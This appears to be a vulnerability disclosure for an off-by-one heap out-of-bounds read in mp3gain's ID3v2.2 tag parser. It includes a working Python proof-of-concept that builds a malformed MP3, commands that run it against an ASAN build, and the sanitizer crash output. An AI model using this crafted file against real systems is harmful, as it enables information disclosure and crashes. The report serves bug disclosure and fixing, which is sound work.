## Bug0: Off-by-one OOB heap read in ID3v2.2 frame size parsing

The function `id3_parse_v2_tag()` in `id3tag.c` uses an off-by-one boundary check (`p + 5 > dlen` instead of `p + 6 > dlen`) before reading a 6-byte ID3v2.2 frame header, allowing an out-of-bounds read of one heap byte past the end of the allocated tag buffer.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def syncsafe4(n):
    result = bytearray(4)
    for i in range(3, -1, -1):
        result[i] = n & 0x7F
        n >>= 7
    return bytes(result)

tag_body_size = 16
id3_header = b"ID3" + bytes([0x02, 0x00, 0x00]) + syncsafe4(tag_body_size)
assert len(id3_header) == 10

# Tag body layout (16 bytes total):
#   Bytes  0- 2: "TT2"          frame 1 ID
#   Bytes  3- 5: 0x00 0x00 0x05 frame 1 size = 5
#   Bytes  6-10: 0x00*5         frame 1 data
#   Bytes 11-13: "TT2"          frame 2 ID
#   Bytes 14-15: 0x00 0x00      first 2 of 3 size bytes for frame 2
#   Byte   16  : OOB            tagdata[16] is one past malloc(16)
#
# At frame 2: p=11, dlen=16
#   check: if (11 + 5 > 16) => false => no badtag
#   read:  tagdata[11+5] = tagdata[16] => heap-buffer-overflow
tag_body = (
    b"TT2" +
    bytes([0x00, 0x00, 0x05]) +
    bytes(5) +
    b"TT2" +
    bytes([0x00, 0x00])
)
assert len(tag_body) == 16

mp3_sync = bytes([0xFF, 0xFB, 0x90, 0x00])
mp3_padding = bytes(413)

data = id3_header + tag_body + mp3_sync + mp3_padding

with open("poc_input.mp3", "wb") as f:
    f.write(data)

print(f"Written {len(data)} bytes to poc_input.mp3")
print(f"  ID3 header: {id3_header.hex()}")
print(f"  Tag body:   {tag_body.hex()}")
print(f"  dlen=16: malloc(16) -> tagdata[16] is in heap right redzone")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain -s i poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000040 at pc 0x5648188675c9 bp 0x7ffd159fdb00 sp 0x7ffd159fdaf0
READ of size 1 at 0x502000000040 thread T0
    #0 0x5648188675c8 in id3_parse_v2_tag
    #1 0x564818868748 in id3_search_tag
0x502000000040 is located 0 bytes to the right of 16-byte region [0x502000000030,0x502000000040)
=>0x0a047fff8000: fa fa 00 00 fa fa 00 00[fa]fa 05 fa fa fa fa fa

### Impact

An attacker who supplies a crafted MP3 file with a malformed ID3v2.2 tag can cause mp3gain to read one byte past the end of a heap allocation, exposing heap metadata or adjacent object data (information disclosure) and potentially crashing the process when the allocation ends at a page boundary (denial of service). Any invocation of mp3gain with the `-s i` flag on an untrusted file triggers this path, making the attack surface all command-line and automated batch uses of mp3gain. While the out-of-bounds byte feeds into a frame-length calculation, subsequent bounds checks limit further memory corruption beyond the initial one-byte read.
